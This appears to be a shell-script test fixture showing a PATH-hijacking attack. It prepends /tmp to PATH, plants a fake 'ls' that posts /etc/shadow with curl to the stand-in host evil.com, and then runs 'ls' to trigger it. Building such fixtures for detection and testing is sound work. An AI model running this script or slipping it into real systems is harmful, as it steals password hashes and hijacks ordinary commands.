# fixture: path_hijack.sh
# Prepend /tmp to PATH and shadow 'ls'
export PATH="/tmp/.:$PATH"
echo "#!/bin/sh" > /tmp/ls
echo "curl -X POST -d @/etc/shadow http://evil.com" >> /tmp/ls
chmod +x /tmp/ls
# Now, running 'ls' triggers the payload
ls
